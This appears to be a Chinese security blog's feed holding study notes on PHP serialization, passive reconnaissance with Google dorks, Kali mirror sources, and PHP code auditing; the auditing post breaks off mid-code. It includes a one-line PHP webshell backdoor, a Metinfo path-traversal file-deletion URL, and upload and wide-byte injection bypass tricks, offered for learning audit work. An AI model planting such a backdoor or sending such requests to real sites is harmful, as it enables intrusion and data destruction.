length为长度。</p><p> mysql中的start是从1开始的，而hibernate中的start是从0开始的。</p></blockquote><p><a name="ZEIxq"></a></p><h2 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h2><p><a name="vQHMa"></a></p><h3 id="魔术方法定义"><a href="#魔术方法定义" class="headerlink" title="魔术方法定义"></a>魔术方法定义</h3><p><a href="https://www.php.net/manual/zh/language.oop5.decon.php#object.construct">__construct()</a>， <a href="https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct">__destruct()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.set-state">__set_state()</a>， <a href="https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone">__clone()</a> 和 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.debuginfo">__debugInfo()</a> 等方法在 PHP 中被称为魔术方法（Magic methods）。<br />PS:在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。<br><a name="VQ3bA"></a></p><h3 id="魔术方法表示"><a href="#魔术方法表示" class="headerlink" title="魔术方法表示"></a>魔术方法表示</h3><p>PHP 将所有以 <strong>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以</strong> 为前缀。<br><a name="tph4C"></a></p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p><a name="12yZK"></a></p><h5 id="序列化：serialize-来返回一个包含字节流的字符串来表示"><a href="#序列化：serialize-来返回一个包含字节流的字符串来表示" class="headerlink" title="序列化：serialize()来返回一个包含字节流的字符串来表示"></a>序列化：<a href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>来返回一个包含字节流的字符串来表示</h5><blockquote><p><a href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a> 函数会检查类中是否存在一个魔术方法 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a><br>如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a> 方法常用于提交未提交的数据，或类似的清理操作。</p></blockquote><p><a name="1L1t9"></a></p><h5 id="反序列化函数：unserialize-函数能够重新把字符串变回php原来的值"><a href="#反序列化函数：unserialize-函数能够重新把字符串变回php原来的值" class="headerlink" title="反序列化函数：unserialize()函数能够重新把字符串变回php原来的值"></a>反序列化函数：<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>函数能够重新把字符串变回php原来的值</h5><blockquote><p><a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a> 会检查是否存在一个 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 方法。如果存在，则会先调用 __<em>wakeup</em> 方法，预先准备对象需要的资源。<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p></blockquote><br /><a name="wvpLn"></a>##### 序列化各个量表示的含义<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">序列化函数serialize()</span><br><span class="line">序列化举例说明：</span><br><span class="line">O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">3 代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line">3 代表三个属性</span><br><span class="line">s代表字符串</span><br><span class="line">4代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Notes on Gathering Information [1]</title>
      <link href="/2019/09/23/Notes-on-Gathering-Information/"/>
      <url>/2019/09/23/Notes-on-Gathering-Information/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li><p>HTTrack:网站克隆</p></li><li><p>Google指令——利用谷歌搜索实践</p></li><li><p>The Harvester:挖掘并利用邮箱地址</p></li><li><p>Whois</p></li><li><p>Netcraft</p></li><li><p>host 工具</p></li><li><p>从DNS中提取信息</p></li><li><p>从电子邮件服务器中提取信息</p></li><li><p>MetaGooFil</p></li><li><p>社会工程学</p></li><li><p>筛选提炼信息：找到可攻击目标</p></li></ul><h1 id="对信息收集的认识误区"><a href="#对信息收集的认识误区" class="headerlink" title="对信息收集的认识误区"></a>对信息收集的认识误区</h1><p>信息收集是渗透测试的中最不受重视的一个环节</p><blockquote><p>这样的认识很明显是打错特所的，正相反，这是最重要的一步，但也是最容易被忽略的一步，那么它的影响程度到底有多大呢？<br>可以毫不夸张的说，在收集目标信息上所花费的时间越多，后续阶段的成功率也就越高。</p></blockquote><h1 id="信息收集浅谈"><a href="#信息收集浅谈" class="headerlink" title="信息收集浅谈"></a>信息收集浅谈</h1><p>信息收集主要分为主动和被动</p><p>主动收集：与目标系统的直接交互，目标系统可能会记录下我们的IP地址及活动</p><p>被动收集：利用Google获取海量信息，不会与目标交互，不会被记录活动</p><p>信息收集的目的在于尽可能多的收集与目标相关的信息。并且收集信息的时候要尽可能将数据集中保存起来。</p><h3 id="HTTrack"><a href="#HTTrack" class="headerlink" title="HTTrack"></a>HTTrack</h3><p>当浏览或者探测某个网站的时间越多，那么我们的活动就越有可能被跟踪(哪怕只是随意的浏览网站)，只要是属于目标的资源，任何时候与之交互都有可能留下痕迹。</p><p>利用HTTrack我们可以从某个网站的本地副本中提取额外或者隐藏的信息<br>HTTrack可以将整个网页逐页下载下来，通过它可以建立完全的脱机副本。<br>Kali命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install webhttrack</span><br></pre></td></tr></table></figure><h3 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h3><p>物理地址和位置、电话号码、电子邮箱地址、运营时间、商业关系、员工姓名、与社会化媒体的联系、以及其他公开的花絮趣闻等等</p><p>综上所述，我们要彻查目标网站，对目标有一个全面的了解：是什么(这是一家什么样的公司)、做什么(具体做什么业务)、公司设在哪里。</p><p>在有了这些基本信息之后，我们可以进入被动侦察(即，被动收集)阶段。</p><h3 id="被动侦察"><a href="#被动侦察" class="headerlink" title="被动侦察"></a>被动侦察</h3><p>首先要做的事利用各大搜索引擎对目标进行地毯式的搜索</p><p>不过 仅仅利用好谷歌，我们就可以完成整个渗透测试工作<br>(推荐看Google Hacking  作者:Jonny)</p><p>不得不提一点，在我们被动侦擦过程中，如果我们点击搜索结果的任何一条链接，都会与目标建立系统的联系，也就回到了主动侦察的模式。。。。。</p><h3 id="Google指令——搜索实践"><a href="#Google指令——搜索实践" class="headerlink" title="Google指令——搜索实践"></a>Google指令——搜索实践</h3><p>指令格式：<br>1)你想要用的指令<br>2)半角冒号<br>3)指令中要用到的具体内容</p><p>Eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:domain term(搜索某网站我们想知道的信息)</span><br></pre></td></tr></table></figure><p>allintitle:网页标题必须包含所有的关键字才会出现在搜索结果里<br>intitle:只需包含任意一个关键字即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allintitle:index of(查看web服务器上的所有可用的索引目录列表)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:admin(这条命令用于发现目标网站的管理或者设者页面)</span><br></pre></td></tr></table></figure><blockquote><p>使用Google快照会减少在目标服务器上留下痕迹，而且有机会浏览到原网站已移除的网页和文件。只要是谷歌爬虫抓取过的页面，都会在网页快照中保存一个精简的副本。</p></blockquote><p>cache:让谷歌只显示网页快照里的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cache:domain</span><br></pre></td></tr></table></figure><p>filetype:搜索特定文件的扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype:pdf</span><br></pre></td></tr></table></figure><p>命令结合使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:domain filetype:xxx(搜索某网站所有xxx格式的文件)</span><br></pre></td></tr></table></figure><h3 id="利用社交资源"><a href="#利用社交资源" class="headerlink" title="利用社交资源"></a>利用社交资源</h3><p>当我们彻查完目标网页，并借助谷歌服务我们之后，其他社交媒体也会发挥作用。</p><p>一些论坛，或者新闻中心等等可能会出现关于目标的言论，如技术问题。</p><p>简言之，公共论坛算是分享信息并寻求技术支持的宝地。</p><h3 id="The-Harvester"><a href="#The-Harvester" class="headerlink" title="The Harvester"></a>The Harvester</h3><p>….</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Updating Sources</title>
      <link href="/2019/09/09/Kali-Updating-Sources/"/>
      <url>/2019/09/09/Kali-Updating-Sources/</url>
      
        <content type="html"><![CDATA[<p>kali更新源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"># kali官方源</span><br><span class="line">deb http://http.kali.org/ moto main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/ moto main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://security.kali.org/ moto/updates main contrib non-free </span><br><span class="line">deb-src http://security.kali.org/ moto/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#中科大kali源 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#新加坡kali源 </span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib </span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib </span><br><span class="line">deb http://security.kali.org/kali-security kali/updates main contrib non-free </span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free </span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#阿里云kali源 </span><br><span class="line">deb http://mirrors.aliyun.com/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#163 Kali源 </span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib </span><br><span class="line">deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib </span><br><span class="line">deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib </span><br><span class="line">#auto </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#中科大 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#浙大 </span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#东软大学 </span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib </span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line">#重庆大学 </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#官方源 </span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br><span class="line"># kali官方源</span><br><span class="line">deb http://http.kali.org/ kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/ kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>更新安装软件列表和软件;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp; apt-get upgrade</span><br></pre></td></tr></table></figure><p>升级软件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure><p>清理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure><p>重启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learning Code Auditing [1]</title>
      <link href="/2019/07/25/Learning-Code-Auditing-1/"/>
      <url>/2019/07/25/Learning-Code-Auditing-1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、常见的代码审计工具"><a href="#一、常见的代码审计工具" class="headerlink" title="一、常见的代码审计工具"></a>一、常见的代码审计工具</h1><p>1、Fortify SCA</p><p>Fortify SCA是一个静态的、白盒的软件源代码安全测试工具，它通过内置的五大主要分析引擎：数据流、语义、结</p><p>2、Checkmarx CxSuite</p><p>Checkmarx CxSuite的扫描结果可以以静态报表形式展示，也可以通过可以对软件安全漏洞和质量缺陷在代码的运</p><p>3、360代码卫士</p><p>360代码卫士是360企业安全集团基于多年源代码安全实践经验推出的新一代源代码安全检测解决方案，包括源代码</p><p>4、PHP代码审计工具——RIPS</p><p>参考：<a href="https://www.jianshu.com/p/cd1cb66e4d7d">https://www.jianshu.com/p/cd1cb66e4d7d</a></p><p>5、SEAY代码审计（常用）</p><p>参考：<a href="https://www.oschina.net/p/seay">https://www.oschina.net/p/seay</a></p><p>6、SONARQUBE</p><p>参考：<a href="https://www.cnblogs.com/qiumingcheng/p/7253917.html">https://www.cnblogs.com/qiumingcheng/p/7253917.html</a></p><p>7、COBRA</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/32363880">https://zhuanlan.zhihu.com/p/32363880</a></p><p>8、KIWI</p><p>参考：<a href="https://github.com/alpha1e0/kiwi">https://github.com/alpha1e0/kiwi</a></p><h1 id="二、代码审计中常见的危险函数和字符串"><a href="#二、代码审计中常见的危险函数和字符串" class="headerlink" title="二、代码审计中常见的危险函数和字符串"></a>二、代码审计中常见的危险函数和字符串</h1><h2 id="0x01-整体"><a href="#0x01-整体" class="headerlink" title="0x01 整体"></a>0x01 整体</h2><p>学习代码审计的目标是能够独立完成对一个CMS的代码安全监测。其通用的思路有：</p><p>● 通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文</p><p>● 看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是</p><p>● 继续跟读首页文件,index.php,了解程序运作时调用了哪些函数和文件</p><p>以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页</p><h2 id="0x02-各种洞洞"><a href="#0x02-各种洞洞" class="headerlink" title="0x02 各种洞洞"></a>0x02 各种洞洞</h2><p>A.文件操作漏洞</p><p>● 能不用文件名参数就不用 尽量不要让用户可控</p><p>● 平行用户的权限 管理员的权限 操作权限</p><p>● 禁止传入参数类似于这种 .. ,&#x2F;,\ 检查传入的参数,做出限制,停止程序往下执行</p><p>1.文件包含漏洞：</p><p>(1) 本地文件包含：</p><p>● 一般存在于模块加载，模板加载，cache调用</p><p>● 包括函数：include()&#x2F;include_once()，require()&#x2F;require_once()寻找可控变量</p><p>(2) 远程文件包含：</p><p>● 前提条件：allow_url_include &#x3D; on</p><p>● 出现频率不如本地包含</p><p>(3) 文件包含截断：</p><p>● %00截断(php版本小于5.3)</p><p>● 问号截断(问号后面相当于请求的参数，伪截断)</p><p>● 英文(.) 反斜杠(&#x2F;) 截断</p><p>2.文件读取(下载)漏洞：</p><p>搜索关键函数:</p><blockquote><p>file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p></blockquote><p>3.文件上传漏洞：</p><p>搜索关键函数:</p><p>move_uploaded_file() 接着看调用这个函数的代码是否存在为限制上传格式或者可以绕过。</p><p>(1) 未过滤或本地过滤：服务器端未过滤，直接上传PHP格式的文件即可利用。</p><p>(2) 黑名单扩展名过滤：</p><p>● 限制不够全面：IIS默认支持解析.asp,.cdx, .asa,.cer等。</p><p>● 扩展名可绕过：</p><p>不被允许的文件格式.php，但是我们可以上传文件名为1.php(注意后面有一个空格)</p><p>(3) 文件头 content-type验证绕过：</p><p>● getimagesize()函数：验证文件头只要为GIF89a，就会返回真。</p><p>● 限制$_FILES[“file”][“type”]的值 就是人为限制content-type为可控变量。</p><p>(4) 防范：</p><p>● 使用in_array()或 利用三等于&#x3D;&#x3D;&#x3D;对比扩展名。</p><p>● 保存上传文件是重命名，规则采用时间戳拼接随机数：md5(time() + rand(1,1000))。</p><p>4.文件删除漏洞：</p><p>搜索关键函数：</p><p>● unlink()利用回溯变量的方式</p><p>● 老版本下的session_destroy()，可以删除文件，现已基本被修复。</p><p>Metinfo的任意文件删除漏洞：</p><p>$action &#x3D; delete即可删除.sql的文件，如果文件不是sql直接删除提交的文件名</p><p><a href="http://target.com/recovery.php?&amp;action=delete&amp;filename=../../index.php">http://target.com/recovery.php?&amp;action=delete&amp;filename=../../index.php</a></p><p>B.代码执行漏洞</p><p>1.代码执行函数：</p><p>搜索关键函数：</p><blockquote><p>eval(), assert(), preg_replace(), call_user_func(), call_user_func_array(), arra</p></blockquote><p>(1) preg_replace()函数：</p><blockquote><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</p></blockquote><p>当$pattern处存在e修饰符时，$replacement 会被当做php代码执行。</p><p>(2)mixed call_user_func( callable $callbank [ , mixed $parameter [ , mixed $…)：</p><p>第一个参数为回调函数，第二个参数是回调函数的参数</p><p>(3)eval()和assert()：</p><p>当assert()的参数为字符串时 可执行PHP代码</p><p>【区分】：</p><p>eval(“ phpinfo(); “);【√】 eval(“ phpinfo() “);【X】</p><p>assert(“ phpinfo(); “);【√】 assert(“ phpinfo() “);【√】</p><p>2.动态函数执行：</p><p>动态函数后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>3.命令执行函数：</p><p>搜索关键函数：</p><blockquote><p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p></blockquote><p>(1) popen和proc_open()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">popen( &#x27;whoami &gt;&gt; /Users/bingdaojueai/Desktop/1.txt&#x27;, &#x27;r&#x27; ); ?&gt;</span><br></pre></td></tr></table></figure><p>所在路径就会出现一个1.txt 里面的内容为命令执行后的结果</p><p>(2) 反引号命令执行：</p><p>echo whoami; 直接就可以执行命令</p><p>双引号和单引号的区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">$a = 1</span><br><span class="line"></span><br><span class="line">echo &quot; $a &quot; output：1</span><br><span class="line"></span><br><span class="line">echo &#x27; $a &#x27; output：$a</span><br></pre></td></tr></table></figure><p>双引号时，可以直接解析变量，造成代码执行漏洞，过狗绕过。</p><p>C.变量覆盖漏洞</p><p>1.函数使用不当：</p><p>● int extract( array &amp;$var_array , int $extract_type &#x3D; EXTR_OVERWRITE , string $prefix &#x3D; null )</p><p>● void parse_str( string $str , array &amp;$arr )</p><p>● bool import_request_variables( string $type , string $prefix )</p><p>2.$$变量覆盖：</p><p>D.逻辑漏洞</p><p>需要思考的问题：</p><p>● 程序是否可以重复安装</p><p>● 修改密码是否存在越权修改其他用户密码</p><p>● 找回密码验证码是否可以暴力破解</p><p>● cookie是否可以预测 验证存在绕过</p><p>1.等于与存在判断绕过：</p><p>(1) in_array(): 比较之前会自动转换类型</p><p>(2)is_numeric():当传入参数为hex时 直接通过并返回true 并且MYSQL可以直接使用hex编码代替字符串明文可以二次注入 并且可能造成XSS漏洞</p><p>(3)双等于&#x3D;&#x3D;和三等于&#x3D;&#x3D;&#x3D;：</p><p>● 双等于会在变量比较时，进行类转换，与in_array()是一样的问题。</p><p>● 三等于是type和value的双重比较，相比之下更加安全。</p><p>2.账户体系中的越权问题：</p><p>● 水平越权：A用户能够以B用户的身份，进行B用户的全部权限操作。前提A用户和B用户拥有相同的权限。</p><p>● 垂直越权：A用户能够以C用户的身份，进行C用户的全部权限操作，前提C用户比A用户拥有更高的权限。</p><p>(1) 未exit&#x2F;return&#x2F;die：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(file_exists(&#x27;install.lock))&#123;</span><br><span class="line"></span><br><span class="line">header(&quot;Location:http://xxx.com&quot;);</span><br><span class="line"></span><br><span class="line">//exit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;test&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>test 依旧会被输出，替换成安装流程，PHP依旧会进行。</p><p>(2) 支付漏洞：</p><p>● 客户端修改单价</p><p>● 客户端修改总价和购买数量</p><p>● 服务端未校验严格</p><p>重复发包利用时间差：</p><h1 id="php"><a href="#php" class="headerlink" title="!php"></a>!php</h1><?phpif (check_money($price)){//Do something//花费几秒$money = $money - $price;}?><p>可能导致漏洞函数： str_replace()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = addslashes($_GET[&#x27;a&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b = addslashes($_GET[&#x27;b&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;$a&lt;br&gt;$b&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$c = str_replace($a,&#x27;&#x27;,$b);</span><br><span class="line"></span><br><span class="line">echo trim($c);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>E.会话认证漏洞</p><p>COOKIE验证：没有使用SESSION验证，将信息直接保存在COOKIE中</p><p>a 找到传入sql语句的参数的传递过程 回溯变量到最原始的函数 看它保存在cookie的算法是否可逆<br>b 和MD5比起 sha1更安全 解密sha1的网站更少<br>c 限制一个用户只能同时在一个IP上登录审计代码时，查看登录处代码</p><p>F.二次漏洞</p><p>1.类型：</p><p>● 不是逻辑问题，是可信问题。</p><p>● 业务逻辑复杂度，与二次漏洞触发率 成正比。</p><p>● 购物车 &#x2F; 订单 &#x2F; 引用数据 &#x2F; 文章编辑 &#x2F; 草稿 &#x3D;&#x3D;&gt; SQL注入 &#x2F; XSS</p><p>2.技巧：</p><p>(1) 钻GPC等转义的空子：</p><p>● 不受GPC保护的$_SERVER变量：PHP5以后，$_SERVER取到的header不再受GPC影响，就算开启特殊字符也</p><p>编码问题转换：</p><p>a GBK的宽字节注入：%df ‘ 单引号自动被转义成(%5c)，同时%df与%5c连在一起组合成運字单引号依然</p><p>mb_convert_encoding()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt; &lt;?php</span><br><span class="line"></span><br><span class="line">$sql = &quot;WHERE 